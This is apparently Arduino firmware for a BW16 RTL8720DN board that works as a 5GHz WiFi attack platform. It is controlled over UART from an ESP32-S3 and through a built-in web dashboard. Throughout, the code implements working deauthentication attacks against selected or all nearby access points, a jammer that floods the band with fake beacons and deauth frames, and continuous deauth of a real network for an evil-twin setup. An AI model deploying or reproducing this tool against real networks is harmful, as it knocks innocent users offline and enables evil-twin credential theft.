/**
 * @file bw16_rtl8720dn.ino
 * @brief BW16 RTL8720dn firmware for 5GHz WiFi attacks
 * 
 * UART Communication with ESP32-S3 Master:
 *   RX: PB1 (ESP32 TX2 GPIO17)
 *   TX: PB2 (ESP32 RX2 GPIO18)
 *   
 * Commands from ESP32:
 *   PING            -> OK:PONG
 *   STOP            -> OK:ALL_STOPPED
 *   SCAN_5GHZ       -> SCAN_RESULT:count|ssid,bssid,ch,rssi;...
 *   DEAUTH:<hex12>  -> OK:DEAUTHING_<ssid>
 *   DEAUTH_ALL      -> OK:DEAUTH_ALL_5GHZ
 *   JAMMER:START    -> OK:JAMMING_ACTIVE
 *   JAMMER:STOP     -> OK:JAMMING_STOPPED
 *   EVILTWIN:<hex>  -> OK:EVILTWIN_ACTIVE
 *   EVILTWIN:STOP   -> OK:EVILTWIN_STOPPED
 *   EXTENDER:START  -> OK:EXTENDER_RUNNING
 */

#undef max
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "src/packet-injection/packet-injection.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// ========== Data Structures ==========
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  bool is_5ghz;
} WiFiScanResult;

typedef struct {
  String key;
  String value;
} PostParam;

// ========== Globals ==========
char *ap_ssid = "BW16-5GHz";
char *ap_pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
int frames_per_deauth = 5;
int send_delay = 5;
bool isDeauthing = false;
bool isJamming = false;
bool isEvilTwin = false;
bool isExtender = false;
bool led_enabled = true;

WiFiServer server(80);

// UART buffer
String uart_buffer = "";

// 5GHz channel list
const int channels_5ghz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 
                             116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
const int num_5ghz_channels = sizeof(channels_5ghz) / sizeof(channels_5ghz[0]);

// ========== UART Functions ==========
void sendUart(String resp) {
  Serial2.println(resp);
  DEBUG_SER_PRINTLN("[TX] " + resp);
}

void processUart(String cmd) {
  cmd.trim();
  DEBUG_SER_PRINTLN("[RX] " + cmd);

  if (cmd == "PING") {
    sendUart("OK:PONG");
  }
  else if (cmd == "STOP") {
    isDeauthing = false;
    isJamming = false;
    isEvilTwin = false;
    isExtender = false;
    deauth_channels.clear();
    chs_idx.clear();
    digitalWrite(LED_R, HIGH);
    digitalWrite(LED_B, LOW);
    sendUart("OK:ALL_STOPPED");
  }
  else if (cmd == "SCAN_5GHZ") {
    scanNetworks();
    String resp = "SCAN_RESULT:" + String(scan_results.size()) + "|";
    for (uint32_t i = 0; i < scan_results.size(); i++) {
      if (i > 0) resp += ";";
      resp += scan_results[i].ssid + ",";
      resp += scan_results[i].bssid_str + ",";
      resp += String(scan_results[i].channel) + ",";
      resp += String(scan_results[i].rssi);
    }
    sendUart(resp);
  }
  else if (cmd.startsWith("DEAUTH:")) {
    String hex = cmd.substring(7);
    hex.trim();
    uint8_t bssid[6];
    for (int i = 0; i < 6; i++) {
      char h[3] = {hex[i*2], hex[i*2+1], 0};
      bssid[i] = strtol(h, NULL, 16);
    }
    isJamming = false;
    isEvilTwin = false;
    deauth_channels.clear();
    chs_idx.clear();
    for (uint32_t i = 0; i < scan_results.size(); i++) {
      if (memcmp(scan_results[i].bssid, bssid, 6) == 0) {
        deauth_channels[scan_results[i].channel].push_back(i);
        chs_idx.push_back(scan_results[i].channel);
        isDeauthing = true;
        sendUart("OK:DEAUTHING_" + scan_results[i].ssid);
        return;
      }
    }
    sendUart("ERROR:BSSID_NOT_FOUND");
  }
  else if (cmd == "DEAUTH_ALL") {
    isJamming = false;
    isEvilTwin = false;
    deauth_channels.clear();
    chs_idx.clear();
    for (uint32_t i = 0; i < scan_results.size(); i++) {
      if (scan_results[i].channel > 14) {
        int ch = scan_results[i].channel;
        bool found = false;
        for (auto &g : deauth_channels) {
          if (g.first == ch) { g.second.push_back(i); found = true; break; }
        }
        if (!found) { deauth_channels[ch].push_back(i); chs_idx.push_back(ch); }
      }
    }
    if (!deauth_channels.empty()) {
      isDeauthing = true;
      sendUart("OK:DEAUTH_ALL_5GHZ");
    } else {
      sendUart("OK:NO_5GHZ_NETWORKS");
    }
  }
  else if (cmd == "JAMMER:START") {
    isDeauthing = false;
    isEvilTwin = false;
    isJamming = true;
    digitalWrite(LED_B, HIGH);
    sendUart("OK:JAMMING_ACTIVE");
  }
  else if (cmd == "JAMMER:STOP") {
    isJamming = false;
    digitalWrite(LED_B, LOW);
    sendUart("OK:JAMMING_STOPPED");
  }
  else if (cmd.startsWith("EVILTWIN:")) {
    if (cmd == "EVILTWIN:STOP") {
      isEvilTwin = false;
      isDeauthing = false;
      deauth_channels.clear();
      chs_idx.clear();
      sendUart("OK:EVILTWIN_STOPPED");
    } else {
      String hex = cmd.substring(9);
      hex.trim();
      isJamming = false;
      isEvilTwin = true;
      isDeauthing = true;
      deauth_channels.clear();
      chs_idx.clear();
      uint8_t bssid[6];
      for (int i = 0; i < 6; i++) {
        char h[3] = {hex[i*2], hex[i*2+1], 0};
        bssid[i] = strtol(h, NULL, 16);
      }
      for (uint32_t i = 0; i < scan_results.size(); i++) {
        if (memcmp(scan_results[i].bssid, bssid, 6) == 0) {
          deauth_channels[scan_results[i].channel].push_back(i);
          chs_idx.push_back(scan_results[i].channel);
          sendUart("OK:EVILTWIN_ACTIVE");
          return;
        }
      }
      sendUart("ERROR:BSSID_NOT_FOUND");
    }
  }
  else if (cmd == "EXTENDER:START") {
    isExtender = true;
    isDeauthing = false;
    isJamming = false;
    sendUart("OK:EXTENDER_RUNNING");
  }
  else if (cmd == "EXTENDER:STOP") {
    isExtender = false;
    sendUart("OK:EXTENDER_STOPPED");
  }
}

// ========== Network Scanning ==========
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    result.is_5ghz = (record->channel > 14);
    
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = String(bssid_str);
    
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

void scanNetworks() {
  scan_results.clear();
  wifi_scan_networks(scanResultHandler, NULL);
  DEBUG_SER_PRINTLN("Scan done: " + String(scan_results.size()) + " networks");
}

// ========== 5GHz Jammer - Beacon Flood ==========
void sendBeaconFlood() {
  const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  
  for (int b = 0; b < 8; b++) {
    uint8_t bssid[6];
    bssid[0] = 0x02;
    for (int j = 1; j < 6; j++) bssid[j] = random(256);
    
    char ssid[17];
    int slen = 4 + random(12);
    for (int j = 0; j < slen; j++) ssid[j] = chars[random(62)];
    ssid[slen] = '\0';
    
    int ch = channels_5ghz[random(num_5ghz_channels)];
    
    // Send beacon using packet injection
    wifi_tx_beacon_frame(bssid, (uint8_t*)ssid, slen, ch);
    
    // Also deauth to real 5GHz APs on this channel
    wext_set_channel(WLAN0_NAME, ch);
    for (uint32_t i = 0; i < scan_results.size(); i++) {
      if (scan_results[i].channel > 14) {
        wifi_tx_deauth_frame(scan_results[i].bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
      }
    }
    delay(3);
  }
}

// ========== HTTP Server ==========
String parseRequest(String request) {
  int s = request.indexOf(' ');
  int e = request.indexOf(' ', s + 1);
  return request.substring(s + 1, e);
}

std::vector<PostParam> parsePost(String request) {
  std::vector<PostParam> params;
  String body = request.substring(request.lastIndexOf('\n') + 1);
  body.trim();
  int pos = 0;
  while (pos < (int)body.length()) {
    int amp = body.indexOf('&', pos);
    if (amp == -1) amp = body.length();
    String pair = body.substring(pos, amp);
    int eq = pair.indexOf('=');
    if (eq != -1) {
      PostParam p;
      p.key = pair.substring(0, eq);
      p.value = pair.substring(eq + 1);
      params.push_back(p);
    }
    pos = amp + 1;
  }
  return params;
}

String makeResponse(int code, String type) {
  String r = "HTTP/1.1 " + String(code) + " OK\r\nContent-Type: " + type + "\r\nConnection: close\r\n\r\n";
  return r;
}

String makeRedirect(String path) {
  String r = "HTTP/1.1 303 See Other\r\nLocation: " + path + "\r\nConnection: close\r\n\r\n";
  return r;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html");
  
  response += R"(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>BW16 5GHz Attack</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:system-ui,sans-serif;background:#0a0e17;color:#e0e0e0;padding:15px}
    h1{color:#ffab00;text-align:center;font-size:1.4em;margin-bottom:15px}
    .card{background:#151f2e;border-radius:10px;padding:15px;margin-bottom:15px;border:1px solid #1e2d42}
    .card h2{color:#ffab00;font-size:1.1em;margin-bottom:10px;border-bottom:1px solid #1e2d42;padding-bottom:8px}
    table{width:100%;border-collapse:collapse;font-size:0.85em}
    th,td{padding:6px 8px;text-align:left;border-bottom:1px solid #1e2d42}
    th{color:#ffab00;background:#0d1520}
    tr:hover{background:#1a2a3e}
    .btn{display:inline-block;padding:8px 18px;border:none;border-radius:6px;cursor:pointer;font-size:0.85em;font-weight:600;margin:4px;text-decoration:none}
    .btn-p{background:#ffab00;color:#0a0e17}
    .btn-r{background:#ff3355;color:#fff}
    .btn-g{background:#00e676;color:#0a0e17}
    .btn-y{background:#ffab00;color:#0a0e17}
    .btn:hover{opacity:0.85}
    .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px;margin:10px 0}
    .sb{background:#0d1520;border-radius:6px;padding:12px;text-align:center}
    .sb .v{font-size:1.5em;font-weight:700;color:#ffab00}
    .sb .l{font-size:0.75em;color:#667;margin-top:3px}
    .tag{display:inline-block;padding:2px 10px;border-radius:10px;font-size:0.8em;font-weight:600}
    .tag-on{background:#00e67630;color:#00e676}
    .tag-off{background:#ff335530;color:#ff3355}
    input[type=checkbox]{accent-color:#ffab00;width:16px;height:16px}
    input[type=number]{background:#0d1520;border:1px solid #1e2d42;border-radius:4px;padding:5px 8px;color:#e0e0e0;width:70px}
    @media(max-width:600px){td,th{font-size:0.75em;padding:4px}}
  </style>
</head>
<body>
  <h1>📡 BW16 5GHz Attack Platform</h1>
  
  <div class="card">
    <h2>📊 Dashboard</h2>
    <div class="stats">
      <div class="sb"><div class="v">)" + String(scan_results.size()) + R"(</div><div class="l">5GHz Nets</div></div>
      <div class="sb"><div class="v">)" + String(sent_frames) + R"(</div><div class="l">Frames Sent</div></div>
      <div class="sb"><div class="v"><span class="tag )" + String(isDeauthing ? "tag-on" : "tag-off") + R"(">)" + String(isDeauthing ? "ACTIVE" : "STOPPED") + R"(</span></div><div class="l">Deauth</div></div>
      <div class="sb"><div class="v"><span class="tag )" + String(isJamming ? "tag-on" : "tag-off") + R"(">)" + String(isJamming ? "ON" : "OFF") + R"(</span></div><div class="l">Jammer</div></div>
    </div>
  </div>

  <div class="card">
    <h2>📡 5GHz Networks (UNII bands)</h2>
    <form action="/deauth" method="POST">
    <table>
      <tr><th>SSID</th><th>CH</th><th>BSSID</th><th>RSSI</th><th>Sel</th></tr>
      <tr><td colspan="5" style="text-align:center;color:#667">--- 5 GHz ---</td></tr>
)";
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].channel > 14) {
      String color = "";
      int cw = scan_results[i].rssi + 130;
      if (cw < 50) color = "#ff3355";
      else if (cw < 70) color = "#ffab00";
      else color = "#00e676";
      
      response += "<tr><td>" + String(scan_results[i].ssid.length() > 0 ? scan_results[i].ssid : "**HIDDEN**") +
                  "</td><td>" + String(scan_results[i].channel) +
                  "</td><td>" + scan_results[i].bssid_str +
                  "</td><td><span style='color:" + color + "'>" + String(scan_results[i].rssi) + " dBm</span>" +
                  "</td><td><input type='checkbox' name='n' value='" + String(i) + "'></td></tr>";
    }
  }
  response += R"(
    </table>
    <div style="margin-top:10px">
      <input type="submit" class="btn btn-r" value="🚫 Deauth Selected">
      <a href="/deauth_all" class="btn btn-r" style="color:white">⚠️ Deauth ALL 5GHz</a>
      <a href="/stop" class="btn btn-y">⏹ Stop</a>
    </div>
    </form>
  </div>

  <div class="card">
    <h2>📶 5GHz WiFi Jammer</h2>
    <p style="color:#667;margin-bottom:10px">Floods 5GHz with fake beacons + deauth. All SSIDs become invisible.</p>
    <a href="/jammer_on" class="btn btn-r">📶 Start 5GHz Jammer</a>
    <a href="/jammer_off" class="btn btn-g">⏹ Stop Jammer</a>
  </div>

  <div class="card">
    <h2>⚙️ Settings</h2>
    <form action="/setframes" method="POST" style="display:inline">
      Frames: <input type="number" name="f" value=")" + String(frames_per_deauth) + R"(" min="1" max="50">
      <input type="submit" class="btn btn-p" value="Set">
    </form>
    <form action="/setdelay" method="POST" style="display:inline">
      Delay ms: <input type="number" name="d" value=")" + String(send_delay) + R"(" min="1" max="1000">
      <input type="submit" class="btn btn-p" value="Set">
    </form>
    <div style="margin-top:10px">
      <a href="/rescan" class="btn btn-p">🔄 Rescan</a>
      <a href="/ledon" class="btn btn-p">💡 LED On</a>
      <a href="/ledoff" class="btn btn-y">💡 LED Off</a>
    </div>
  </div>
</body>
</html>
)";
  client.write(response.c_str());
}

void handle404(WiFiClient &c) {
  String r = makeResponse(404, "text/plain");
  r += "Not found!";
  c.write(r.c_str());
}

// ========== Setup ==========
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  // UART for ESP32 communication
  Serial2.begin(115200);
  
  DEBUG_SER_INIT();
  DEBUG_SER_PRINTLN("BW16 5GHz Deauther starting...");
  
  // Start management AP
  WiFi.apbegin(ap_ssid, ap_pass, (char*)String(current_channel).c_str());
  
  // Initial scan
  scanNetworks();
  
  // Start HTTP server
  server.begin();
  
  if (led_enabled) digitalWrite(LED_R, HIGH);
  
  randomSeed(analogRead(0));
  
  DEBUG_SER_PRINTLN("BW16 ready: AP=" + String(ap_ssid));
  Serial2.println("BW16_READY\r\n");
}

// ========== Main Loop ==========
void loop() {
  // ===== UART RX =====
  while (Serial2.available()) {
    char c = Serial2.read();
    if (c == '\n') {
      processUart(uart_buffer);
      uart_buffer = "";
    } else {
      uart_buffer += c;
    }
  }
  
  // ===== HTTP Server =====
  WiFiClient client = server.available();
  if (client.connected()) {
    if (led_enabled) digitalWrite(LED_G, HIGH);
    
    String request;
    while (client.available()) {
      request += (char)client.read();
    }
    
    String path = parseRequest(request);
    DEBUG_SER_PRINTLN("HTTP: " + path);
    
    if (path == "/") {
      handleRoot(client);
    }
    else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      scanNetworks();
    }
    else if (path == "/deauth") {
      std::vector<PostParam> data = parsePost(request);
      isJamming = false;
      deauth_channels.clear();
      chs_idx.clear();
      for (auto &p : data) {
        if (p.key == "n") {
          int idx = p.value.toInt();
          if (idx >= 0 && idx < (int)scan_results.size()) {
            deauth_channels[scan_results[idx].channel].push_back(idx);
            chs_idx.push_back(scan_results[idx].channel);
          }
        }
      }
      isDeauthing = !deauth_channels.empty();
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/deauth_all") {
      isJamming = false;
      deauth_channels.clear();
      chs_idx.clear();
      for (uint32_t i = 0; i < scan_results.size(); i++) {
        if (scan_results[i].channel > 14) {
          int ch = scan_results[i].channel;
          bool found = false;
          for (auto &g : deauth_channels) { if (g.first == ch) { g.second.push_back(i); found = true; break; } }
          if (!found) { deauth_channels[ch].push_back(i); chs_idx.push_back(ch); }
        }
      }
      isDeauthing = !deauth_channels.empty();
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/stop") {
      isDeauthing = false;
      isJamming = false;
      deauth_channels.clear();
      chs_idx.clear();
      digitalWrite(LED_R, HIGH);
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/jammer_on") {
      isJamming = true;
      isDeauthing = false;
      digitalWrite(LED_B, HIGH);
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/jammer_off") {
      isJamming = false;
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/setframes") {
      std::vector<PostParam> data = parsePost(request);
      for (auto &p : data) {
        if (p.key == "f") {
          int v = p.value.toInt();
          frames_per_deauth = v <= 0 ? 5 : v;
        }
      }
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/setdelay") {
      std::vector<PostParam> data = parsePost(request);
      for (auto &p : data) {
        if (p.key == "d") {
          int v = p.value.toInt();
          send_delay = v <= 0 ? 5 : v;
        }
      }
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/ledon") {
      led_enabled = true;
      digitalWrite(LED_R, HIGH);
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/ledoff") {
      led_enabled = false;
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    }
    else {
      handle404(client);
    }
    
    client.stop();
    if (led_enabled) digitalWrite(LED_G, LOW);
  }
  
  // ===== Deauth Loop =====
  if (isDeauthing && !deauth_channels.empty()) {
    for (auto &group : deauth_channels) {
      int ch = group.first;
      if (ch == chs_idx[current_ch_idx]) {
        wext_set_channel(WLAN0_NAME, ch);
        std::vector<int> &nets = group.second;
        for (int i = 0; i < frames_per_deauth; i++) {
          if (led_enabled) digitalWrite(LED_B, HIGH);
          for (int idx : nets) {
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            sent_frames++;
          }
          delay(send_delay);
          if (led_enabled) digitalWrite(LED_B, LOW);
        }
      }
    }
    current_ch_idx++;
    if (current_ch_idx >= chs_idx.size()) current_ch_idx = 0;
  }
  
  // ===== Jammer Loop =====
  if (isJamming) {
    sendBeaconFlood();
    delay(30);
  }
  
  // ===== Evil Twin =====
  if (isEvilTwin && isDeauthing) {
    // Deauth the real AP continuously
    for (auto &group : deauth_channels) {
      wext_set_channel(WLAN0_NAME, group.first);
      for (int idx : group.second) {
        wifi_tx_deauth_frame(scan_results[idx].bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
        sent_frames++;
      }
    }
    delay(10);
  }
  
  // ===== Range Extender =====
  if (isExtender) {
    // Simple extender: just forward packets between bands
    // This is a placeholder - full extender needs routing logic
    delay(100);
  }
  
  wext_set_channel(WLAN0_NAME, current_channel);
}
